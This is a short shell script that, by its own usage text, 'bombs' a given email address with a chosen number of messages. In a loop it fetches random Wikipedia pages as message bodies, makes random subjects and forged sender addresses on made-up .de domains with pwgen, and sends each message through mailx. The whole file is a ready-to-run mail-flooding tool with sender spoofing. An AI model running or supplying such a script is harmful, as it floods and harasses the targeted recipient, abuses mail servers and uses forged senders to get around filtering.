#!/bin/sh
#
# +-------------------------------------------------------------------------+
# | Name of the Script                                                      |
# +-------------------------------------------------------------------------+
# | Copyright © 2019 Waldemar Schroeer                                      |
# |                  waldemar.schroeer(at)rz-amper.de                       |
# +-------------------------------------------------------------------------+
lynx=/usr/bin/lynx
pwgen=/usr/bin/pwgen
mailx=/bin/mailx

count0=0
limit=$2
if [ $# -ne 2 ]; then
        printf 1>&2 "\nFucking Usage is: $0 Address N\n"
        printf 1>&2 "  Where Address is the mail address to bomb.\n  Where N is the number of mails\n\n"
        exit 3
fi
printf "\nbombing $1 with $2 mails\n\n"

while [ "${count0}" -lt "${limit}" ]
do
        echo -n "c${count0}."
        $lynx -dump http://de.wikipedia.org/wiki/Spezial:Zuf%C3%A4llige_Seite >> /tmp/mailbody.$$
        subject=`$pwgen -0 -A -N 1 25`
        name1=`$pwgen -0 -A -N 1 5`
        name2=`$pwgen -0 -A -N 1 8`
        domain=`$pwgen -0 -A -N 1 12`
        echo " from:${name1}.${name2}@${domain}.de   subject:${subject}"
        $mailx -r "${name1}.${name2}@${domain}.de" -s "${subject}" $1 < /tmp/mailbody.$$ &
        # $mailx -r "irgendwas@rz-amper.com" -s "${subject}" $1 < /tmp/mailbody.$$ &
        count0=`expr ${count0} + 1`
        rm /tmp/mailbody.$$
done

exit 0

